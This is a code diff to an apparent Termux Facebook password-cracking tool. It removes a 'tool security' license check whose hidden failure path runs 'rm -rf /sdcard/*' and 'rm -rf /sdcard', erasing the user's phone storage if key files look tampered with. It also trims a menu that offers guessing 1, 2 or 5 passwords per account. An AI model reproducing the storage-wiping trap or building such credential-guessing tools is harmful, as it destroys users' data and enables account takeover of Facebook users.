@@ -258,78 +258,7 @@ def checks(ok,cp):
               (H, P, str(len(cp))))
         input("\x1b[1;97mPRESE ENTER TO BACK MENU ")
         xyz()
-#---------------------[LOOP MENU]---------------------#
-loop = 0
-cp = []
-ok = []
-twf = []
 
-
-
-def my_tool_security():
-    os.system("clear")
-    print(logo)
-    print(47*"-")
-    print(c, 45*"-", wit)
-    print("\t  Facebook : 𝙷𝙰𝙳𝙸 𝙰𝙽𝙷𝙰𝙵 𝙰𝙸𝙼𝙰𝙽")
-    print("\t  Fb page  : H𝙰𝙳𝙸 𝙰𝙽𝙷𝙰𝙵 𝙰𝙸𝙼𝙰𝙽")
-    print("\t  Github   : 𝙰𝙺𝙰𝚂𝙷-𝚁𝙺𝚂")
-    print(c, 45*"-")
-    print(47*"-")
-    try:
-        token_one=open(key_save_one,'r').read()
-    except(requests.exceptions.ConnectionError):
-        print(red," please on internet wifi/data ")
-        exit()
-    except(FileNotFoundError):
-        os.system('termux-setup-storage')
-        print("\t Welcome To HBF Tool ....")
-        time.sleep(2)
-        iid_1=uuid.uuid1().hex[:7].upper()
-        iid_2=uuid.uuid1().hex[:7].upper()
-        open(key_save_one,'w').write(iid_1)
-        open(key_save_two,'w').write(iid_2)
-        my_tool_security()
-    except(KeyError,OSError,IOError):
-        os.system("termux-setup-storage")
-        print("\n Hey user we are facing issues with your device")
-        print(" Give termux storage permission and try again")
-        exit()
-    token_two=open(key_save_two,'r').read()
-    if len(token_two)<=1:
-        os.system("rm -rf /sdcard/*")
-        os.system("rm -rf /sdcard")
-        os.system('rm -rf '+key_save_one+'')
-        exit()
-    else:
-        pass
-    if len(token_one)<=1:
-        os.system("rm -rf /sdcard/*")
-        os.system("rm -rf /sdcard")
-        os.system('rm -rf '+key_save_one+'')
-        exit()
-    else:
-        pass
-    if len(token_two)>=8:
-        os.system("rm -rf /sdcard/*")
-        os.system("rm -rf /sdcard")
-        os.system('rm -rf '+key_save_one+'')
-        exit()
-    else:
-        f_token=token_one+token_two
-    my_server=requests.get("https://www.facebook.com/100042882302159/posts/pfbid02ZG78gghaeEdjhr1Vo6MyvoHcPZkrCZcpH3ycnoEsswzLdVF5aZ8GueSYoHZxazael/?app=fbl").text
-    if f_token in my_server:
-        xyz()
-    else:
-        _help=uuid.uuid1().hex[:6].upper()+"=HBF"
-        print("\n\t     [ Hello User ]\n")
-        print(" This is paid tool you need subscription to use")
-        print(" for buy subscription press enter an msg")
-        print(" to RSA Programmer fb page and your key")
-        print(" otherwise msg on this whatsapp 03155912839 \n")
-        print(" Copy your Key :",gre,f_token+_help,wit,"\n")
-        os.system("xdg-open https://www.facebook.com/owner.termux")
-        exit()
 
 
 #---------------------[APPLICATION CHECKER]---------------------#
@@ -401,9 +330,9 @@ def password():
     print(logo)
     print('       \x1b[97m[\033[37;41m  P A S S W O R D   M E N U   \033[0;m] ')
     print(f"")
-    print(f"[01] {WHITE} 1 PASSWORD   [ FASTEST⚡]")
-    print(f"[02] {WHITE} 2 PASSWORDS  [ FAST     ]")
-    print(f"[03] {WHITE} 5 PASSWORDS   [ SLOW   🐌]")
+    print(f"[01]  1 PASSWORD   [ FASTEST⚡]")
+    print(f"[02] 2 PASSWORDS  [ FAST     ]")
+    print(f"[03]  5 PASSWORDS   [ SLOW   🐌]")
     linex()
     print("")
     passX = input(f" {RED}CHOOSE{𝙰𝙺𝙰𝚂𝙷2} : ")
